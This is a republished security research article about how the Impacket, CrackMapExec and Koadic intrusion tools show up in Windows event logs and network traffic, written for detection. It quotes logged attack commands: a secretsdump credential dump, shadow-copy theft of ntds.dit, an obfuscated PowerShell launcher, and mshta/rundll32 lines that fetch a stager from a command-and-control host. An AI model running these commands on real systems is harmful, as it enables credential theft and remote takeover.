<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How to detect attacks on Windows infrastructure: we study the tools of hackers</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The number of attacks in the corporate sector is growing every year: for example, in 2017, there were 13% more unique incidents than in 2016, and by t...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How to detect attacks on Windows infrastructure: we study the tools of hackers</h1><div class="post__text post__text-html js-mediator-article"> <a href="https://habr.com/ru/company/pt/blog/460517/"><img src="https://habrastorage.org/webt/qm/kv/ra/qmkvra9qmrta93tfbev2d6pdm7k.png"></a> <br><br>  The number of attacks in the corporate sector is growing every year: for example, <a href="https://www.ptsecurity.com/upload/corporate/ru-ru/analytics/Cybersecurity-threatscape-2017-rus.pdf">in 2017, there were 13% more unique incidents</a> than in 2016, and by the end of 2018, <a href="https://www.ptsecurity.com/ru-ru/research/analytics/cybersecurity-threatscape-2018/">there were 27% more incidents</a> than in the previous period.  Including those where the main working tool is the Windows operating system.  In 2017‚Äì2018, APT Dragonfly, APT28, <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/campaign-possibly-connected-muddywater-surfaces-middle-east-central-asia/">APT MuddyWater groups</a> launched attacks against government and military organizations in Europe, North America and Saudi Arabia.  And they used three tools for this - <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> , <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> and <a href="https://github.com/zerosum0x0/koadic">Koadic</a> .  Their source code is open and available on GitHub. <br><br>  It should be noted that these tools are not used for primary penetration, but for the development of an attack inside the infrastructure.  Attackers use them at different stages of attack, following after overcoming the perimeter.  This, by the way, is difficult to detect and often only with the help of technologies that <a href="https://www.ptsecurity.com/ru-ru/research/webinar/295012/">detect traces of compromise in network traffic</a> or tools that allow <a href="https://www.ptsecurity.com/ru-ru/about/news/maxpatrol-siem-vyyavlyaet-popytki-zakrepleniya-atakuyuschih-po-modeli-mitre-attck/">detecting active actions of an attacker after it penetrates the infrastructure</a> .  Tools provide many functions - from transferring files to interacting with the registry and executing commands on a remote machine.  We conducted a study of these tools to determine their network activity. <a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      What we needed to do: <br><br><ul><li>  <b>Understand how hacking tools work</b> .  Learn what attackers need to operate and what technologies they can use. </li><li>  <b>Find what is not detected by means of information security in the early stages of an attack</b> .  The intelligence stage can be skipped, either because the attacker is an internal attacker, or because the attacker uses a gap in the infrastructure that was not previously known.  It becomes possible to restore the entire chain of his actions, hence the desire to detect further movement. </li><li>  <b>Eliminate the false alarms of intrusion detection tools</b> .  We must not forget that when detecting certain actions based on intelligence alone, frequent mistakes are possible.  Usually in the infrastructure there are a sufficient number of ways that are indistinguishable from those that are legitimate at first glance, to get some information. </li></ul><br>  What gives the attacker these tools?  If this is Impacket, then attackers get a large library of modules that can be used at different stages of the attack, following after overcoming the perimeter.  Many tools use Impacket modules inside - for example, Metasploit.  It has dcomexec and wmiexec for remote command execution, secretsdump for retrieving accounts from memory that are added from Impacket.  As a result, the correct detection of the activity of such a library will provide the detection of derivatives. <br><br>  About CrackMapExec (or just CME), the creators wrote by chance "Powered by Impacket".  In addition, CME has in itself ready-made functionality for popular scenarios: these are Mimikatz for getting passwords or their hashes, and the introduction of Meterpreter or the Empire agent for remote execution, and Bloodhound on board. <br><br>  The third tool we choose is Koadic.  It is quite fresh, was presented at the international hacker conference DEFCON 25 in 2017 and is notable for non-standard approach: work through HTTP, Java Script and Microsoft Visual Basic Script (VBS).  This approach is called living off the land: the tool uses a set of dependencies and libraries built into Windows.  The creators call it COM ommand &amp; ontrol, or 3. <br><br><h2>  IMPACKET </h2><br>  Impacket's functionality is quite wide, ranging from intelligence inside AD and data collection from internal MS SQL servers, to technicians to get credentials: this is an SMB relay attack, and receiving from the domain controller the ntds.dit file containing user password hashes.  Also, Impacket remotely executes commands using four different methods: via WMI, a service for managing Windows Scheduler, DCOM and SMB, and for this it needs credentials. <br><br><h3>  Secretsdump </h3><br>  Let's look at secretsdump.  This is a module whose purpose can be both user machines and domain controllers.  With it, you can get a copy of the memory areas LSA, SAM, SECURITY, NTDS.dit, so it can be seen at different stages of the attack.  The first step in the operation of the module is SMB authentication, for which either a user password or his hash is required to automatically conduct the Pass the Hash attack.  Next comes a request to open access to Service Control Manager (SCM) and gain access to the registry via the winreg protocol, using which an attacker can find out the data of the branches of interest and get results via SMB. <br><br>  In fig.  1 we see how exactly when using the winreg protocol, access to the registry key with LSA occurs.  To do this, use the DCERPC command with opcode 15 - OpenKey. <br><br><img src="https://habrastorage.org/webt/28/g3/uf/28g3ufutlahahdolf8mne9sa4q4.png"><br>  <i>Fig.</i>  <i>1. Opening the registry key using the winreg protocol</i> <br><br>  Further, when key access is obtained, the values ‚Äã‚Äãare saved by using the SaveKey command with opcode 20. Impacket does this in a very specific way.  It saves values ‚Äã‚Äãto a file whose name is a string of 8 random characters with the addition of .tmp.  In addition, this file is further uploaded via SMB from the System32 directory (Fig. 2). <br><br><img src="https://habrastorage.org/webt/v8/o-/56/v8o-56ycynu817pivdpr65jvtk8.png"><br>  <i>Fig.</i>  <i>2. Scheme for obtaining a registry key from a remote machine</i> <br><br>  It turns out that it is possible to detect such activity on the network by querying certain branches of the registry using the winreg protocol, specific names, commands, and their order. <br><br>  This module also leaves traces in the Windows event log, thanks to which it is easily detected.  For example, as a result of the command <br><br><pre><code class="bash hljs">secretsdump.py -debug -system SYSTEM -sam SAM -ntds NTDS -security SECURITY -bootkey BOOTKEY -outputfile 1.txt -use-vss -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span>-method mmcexec -user-status -dc-ip 192.168.202.100 -target-ip 192.168.202.100 contoso/Administrator:@DC</code> </pre> <br>  in the Windows Server 2016 log, we will see the following key event sequence: <br><br>  1. 4624 - Remote Logon. <br>  2. 5145 - checking access rights to the remote winreg service. <br>  3. 5145 - check file permissions in the System32 directory.  The file has a random name mentioned above. <br>  4. 4688 - creating a cmd.exe process that starts vssadmin: <br><br><pre> <code class="bash hljs">‚ÄúC:\windows\system32\cmd.exe<span class="hljs-string"><span class="hljs-string">" /Q /c echo c:\windows\system32\cmd.exe /C vssadmin list shadows ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span></span></code> </pre> <br>  5. 4688 - creating a process with the command: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin create shadow /For=C: ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  6. 4688 - creating a process with the command: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit %SYSTEMROOT%\Temp\rmumAfcn.tmp ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  7. 4688 - creating a process with the command: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin delete shadows /For=C: /Quiet ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br><h3>  Smbexec </h3><br>  Like many tools for post-operation, Impacket has modules for remote command execution.  We will focus on smbexec, which gives an interactive command shell on a remote machine.  This module also requires SMB authentication with either a password or its hash.  In fig.  3 we see an example of the operation of such a tool, in this case, it is the local administrator console. <br><br><img src="https://habrastorage.org/webt/65/dx/os/65dxos1pwb3v9sy457qqqcasjzi.png"><br>  <i>Fig.</i>  <i>3. Interactive smbexec console</i> <br><br>  The first stage of the smbexec operation after authentication is the opening of the SCM by the OpenSCManagerW command (15).  The query is notable: in it, the MachineName field is DUMMY. <br><br><img src="https://habrastorage.org/webt/rr/ob/go/rrobgonzydm5evu36sxa3awiw0k.png"><br>  <i>Fig.</i>  <i>4. Request to open Service Control Manager</i> <br><br>  Next, a service is created using the CreateServiceW (12) command.  In the case of smbexec, we can see every time the same logic of command building.  In fig.  5 green unchanged command parameters, yellow - what an attacker can change.  It is easy to see that the name of the executable file, its directory and output file can be changed, but the rest is much more difficult to change without disturbing the logic of the Impacket module. <br><br><img src="https://habrastorage.org/webt/in/na/fo/innafo8sq7hwikto5cli9sv9-ow.png"><br>  <i>Fig.</i>  <i>5. Request to create a service using Service Control Manager</i> <br><br>  Smbexec also leaves obvious traces in the Windows event log.  In the Windows Server 2016 log for an interactive command shell with the ipconfig command, we see the following key sequence of events: <br><br>  1. 4697 - installation of the service on the victim's machine: <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  2. 4688 - creation of the cmd.exe process with arguments from clause 1. <br>  3. 5145 - checking the permissions of the __output file in the C $ directory. <br>  4. 4697 - installation of the service on the victim's machine. <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> ipconfig ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  5. 4688 - the creation of the cmd.exe process with the arguments from clause 4. <br>  6. 5145 - Authorization of access to the __output file in the C $ directory. <br><br>  Impacket is the basis for developing attack tools.  It supports almost all protocols in the Windows infrastructure and at the same time has its own characteristic features.  Here you can find specific winreg requests, use of the SCM API with typical command generation, file name format, and SMB share SYSTEM32. <br><br><h2>  CRACKMAPEXEC </h2><br>  The CME tool is designed primarily to automate the routine actions that an attacker has to perform in order to advance within the network.  It allows you to work in conjunction with the notorious Empire agent and Meterpreter.  To execute commands covertly, CME can obfusts them.  Using Bloodhound (a separate intelligence tool), an attacker can automate the search for an active domain administrator session. <br><br><h3>  Bloodhound </h3><br>  Bloodhound as a standalone tool allows you to conduct advanced intelligence within the network.  It collects data about users, machines, groups, sessions, and is supplied as a PowerShell script or binary file.  LDAP or SMB based protocols are used to collect information.  The CME integration module allows you to load the Bloodhound onto the victim's machine, run and retrieve the collected data after execution, thereby automating the actions in the system and making them less noticeable.  The graphical shell of Bloodhound presents the collected data in the form of graphs, which allows you to find the shortest path from the attacker's machine to the domain administrator. <br><br><img src="https://habrastorage.org/webt/5g/b6/xm/5gb6xmpsvew_hmxv_j_e6z89nec.png"><br>  <i>Fig.</i>  <i>6. Bloodhound interface</i> <br><br>  To run on the victim‚Äôs machine, the module creates a task using ATSVC and SMB.  ATSVC is an interface for working with the Windows Task Scheduler.  CME uses its NetrJobAdd (1) function to create tasks over the network.  An example of what the CME sends is shown in Figure 2.  7: This is a call to the cmd.exe command and the obfuscated code in the form of arguments in XML format. <br><br><img src="https://habrastorage.org/webt/h1/ft/_t/h1ft_tmh38cii_onpk6k4dydd10.png"><br>  <i>Fig.7.</i>  <i>Task creation via CME</i> <br><br>  After the task is submitted for execution, the victim's machine launches the Bloodhound itself, and you can see it in the traffic.  The module is characterized by LDAP requests for retrieving standard groups, a list of all machines and users in a domain, and obtaining information about active user sessions via an SRVSVC NetSessEnum request. <br><br><img src="https://habrastorage.org/webt/pm/i3/5a/pmi35abw7jc1vjo-zrexijzhqks.png"><br>  <i>Fig.</i>  <i>8. Getting a list of active sessions via SMB</i> <br><br>  In addition, the launch of Bloodhound on the victim's machine with auditing enabled is accompanied by an event with ID 4688 (process creation) and the process name <code>¬´C:\Windows\System32\cmd.exe¬ª</code> .  Notable in it are command line arguments: <br><br><pre> <code class="bash hljs">cmd.exe /Q /c powershell.exe -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> bypass -noni -nop -w 1 -C <span class="hljs-string"><span class="hljs-string">" &amp; ( </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$eNV</span></span></span><span class="hljs-string">:cOmSPEc[4,26,25]-JOiN'')( [chAR[]](91 , 78, 101,116 , 46, 83 , 101 , ‚Ä¶ , 40,41 )-jOIN'' ) "</span></span></code> </pre> <br><h3>  Enum_avproducts </h3><br>  Very interesting in terms of functionality and implementation of the module enum_avproducts.  WMI allows using the WQL query language to retrieve data from various Windows objects, which is what the CME module actually uses.  It generates requests to the AntiSpywareProduct and AntiMirusProduct classes about the protections installed on the victim‚Äôs machine.  In order to obtain the necessary data, the module connects to the root \ SecurityCenter2 namespace, then generates a WQL query and receives a response.  In fig.  9 shows the contents of such requests and responses.  In our example, there was a Windows Defender. <br><br><img src="https://habrastorage.org/webt/qs/lx/i5/qslxi5tarfkx3quxppml3vcgudm.png"><br>  <i>Fig.</i>  <i>9. Network activity of the enum_avproducts module</i> <br><br>  Often, WMI (Trace WMI-Activity) auditing, in whose events you can find useful information about WQL queries, can be turned off.  But if it is enabled, then if the enum_avproducts script is run, an event with ID 11 will be saved. It will contain the name of the user who sent the request, and the name in the root \ SecurityCenter2 namespace. <br><br>  Each of the CME modules revealed their own artifacts, be it specific WQL queries or the creation of a specific type of task in the task scheduler with obfuscation and characteristic for Bloodhound activity in LDAP and SMB. <br><br><h2>  KOADIC </h2><br>  A distinctive feature of Koadic is the use of Windows-built JavaScript and VBScript interpreters.  In this sense, it follows the trend of living off the land - that is, it has no external dependencies and uses standard Windows tools.  This is a tool for a full-fledged Command &amp; Control (CnC), since after an infection, an ‚Äúimplant‚Äù is installed on the machine, allowing it to be controlled.  Such a machine, in the terminology of Koadic, is called "zombie."  With a lack of privileges for full-fledged work on the side of the victim, Koadic has the opportunity to raise them using the UAC bypass techniques. <br><br><img src="https://habrastorage.org/webt/z7/lp/e9/z7lpe96_xft7qv9xvusq-4uzukm.png"><br>  <i>Fig.</i>  <i>10. Koadic command shell</i> <br><br>  The victim must initiate communication with the Command &amp; Control server.  To do this, it needs to apply for a pre-prepared URI and get the main body of Koadic using one of the students.  In fig.  Figure 11 shows an example for the mshta pager. <br><br><img src="https://habrastorage.org/webt/rg/sk/fu/rgskfuogt-22hdhlrn8553hi88k.png"><br>  <i>Fig.</i>  <i>11. Initializing a session with a CnC server</i> <br><br>  The response WS variable makes it clear that execution occurs via WScript.Shell, and the STAGER, SESSIONKEY, JOBKEY, JOBKEYPATH, EXPIRE variables contain key information about the parameters of the current session.  This is the first request-response pair in an HTTP connection to the CnC server.  Subsequent requests are directly related to the functionality of the modules called (implants).  All Koadic modules work only with an active session with CnC. <br><br><h3>  Mimikatz </h3><br>  Just as CME works with Bloodhound, Koadic works with Mimikatz as with a separate program and has several ways to launch it.  Below is the request-response pair for loading the Mimikatz implant. <br><br><img src="https://habrastorage.org/webt/d6/8m/4a/d68m4amrfwoylxnmm_o06auiucu.png"><br>  <i>Fig.</i>  <i>12. Transfer of Mimikatz to Koadic</i> <br><br>  You can see how the format of the URI in the request has changed.  In it appeared the value of the variable csrf, which is responsible for the selected module.  Do not pay attention to her name;  we all know that CSRF is usually understood differently.  In response, it was all the same main body Koadic, in which the code associated with Mimikatz was added.  It is quite large, so consider the key points.  Before us is the base64-encoded Mimikatz library, a serialized .NET class that will inject it, and arguments to run Mimikatz.  The result of the execution is transmitted over the network in open form. <br><br><img src="https://habrastorage.org/webt/sg/ua/jx/sguajxxqyymj7sbhr3nwjism2pe.png"><br>  <i>Fig.</i>  <i>13. Result of running Mimikatz on a remote machine.</i> <br><br><h3>  Exec_cmd </h3><br>  Koadic also has modules that can remotely execute commands.  Here we will see the same URI generation method and the familiar sid and csrf variables.  In the case of the exec_cmd module, code is added to the body that is capable of executing shell commands.  The following is the code contained in the HTTP response of the CnC server. <br><br><img src="https://habrastorage.org/webt/v7/3c/yw/v73cywsdkemyp0lsoemc0sn6ed4.png"><br>  <i>Fig.</i>  <i>14. Implant code exec_cmd</i> <br><br>  The variable GAWTUUGCFI with the familiar WS attribute is required to execute the code.  With its help, the implant calls the shell, processing two code branches - shell.exec with the return of the output data stream and shell.run without return. <br><br>  Koadic is not a typical tool, but has its own artifacts by which it can be found in legitimate traffic: <br><br><ul><li>  special formation of HTTP requests, </li><li>  use winHttpRequests API, </li><li>  creating a WScript.Shell object via ActiveXObject, </li><li>  great body performed. </li></ul><br>  The initial connection initiates a steager, so it is possible to detect its activity through Windows events.  For mshta, this is event 4688, which talks about creating a process with the start attribute: <br><br><pre> <code class="bash hljs">C:\Windows\system32\mshta.exe http://192.168.211.1:9999/dXpT6</code> </pre> <br>  During Koadic execution, you can see other 4688 events with attributes that perfectly characterize it: <br><br><pre> <code class="bash hljs">rundll32.exe http://192.168.241.1:9999/dXpT6?sid=1dbef04007a64fba83edb3f3928c9c6c; csrf=;\..\..\..\mshtml,RunHTMLApplication rundll32.exe http://192.168.202.136:9999/dXpT6?sid=12e0bbf6e9e5405690e5ede8ed651100;csrf=18f93a28e0874f0d8d475d154bed1983;\..\..\..\mshtml,RunHTMLApplication <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; net session 1&gt; C:\Users\user02\AppData\Local\Temp\6dc91b53-ddef-2357-4457-04a3c333db06.txt 2&gt;&amp;1 <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; ipconfig 1&gt; C:\Users\user02\AppData\Local\Temp\721d2d0a-890f-9549-96bd-875a495689b7.txt 2&gt;&amp;1</code> </pre> <br><h2>  findings </h2><br>  Trend living off the land is gaining popularity among intruders.  They use the tools and mechanisms built into Windows for their needs.  We see how the popular Koadic, CrackMapExec, and Impacket tools that follow this principle are increasingly found in APT reports.  The number of forks on GitHub for these tools is also growing, new ones appear (now there are about a thousand of them).  The trend is gaining popularity because of its simplicity: attackers do not need third-party tools, they already have on the victims' machines and help to bypass the means of protection.  We focus on exploring network interaction: each tool described above leaves its mark on network traffic;  their detailed study allowed us to teach our <a href="https://www.ptsecurity.com/ru-ru/products/network-attack-discovery/">PT Network Attack Discovery</a> product to detect them, which ultimately helps to investigate the entire chain of cyber incidents with their participation. <br><br>  <b>Authors</b> : <br><br><ul><li>  Anton Tyurin, Head of Expert Services, PT Expert Security Center, Positive Technologies </li><li>  Egor Podmokov, expert, PT Expert Security Center, Positive Technologies </li></ul></div><p>Source: <a href="https://habr.com/ru/post/460517/">https://habr.com/ru/post/460517/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../460509/index.html">How resident proxies help in business: a real case of using Infatica in the field of Data Mining</a></li>
<li><a href="../46051/index.html">Installing Wireless DLink AirPlus XtremeG DWL G520 on Debian Linux</a></li>
<li><a href="../460511/index.html">PHP-FPM setup: use pm static for maximum performance</a></li>
<li><a href="../460513/index.html">Flutter 1.7 - what's new in the release of July 10, 2019</a></li>
<li><a href="../460515/index.html">How close are we really to the emergence of robility?</a></li>
<li><a href="../46052/index.html">Widget Yandex.Clock for the New Year</a></li>
<li><a href="../460521/index.html">The Adventures of the Elusive Malvari, Part IV: DDE and the Word Document Fields</a></li>
<li><a href="../460523/index.html">Announcement of mitap, smoothly turning into BeerPHP drinkcap (in Moscow and online)</a></li>
<li><a href="../460525/index.html">Welcome to DINS IT EVENING in July: QA and JS</a></li>
<li><a href="../460527/index.html">Solution of the task with pwnable.kr 06 - random and 09 - mistake</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>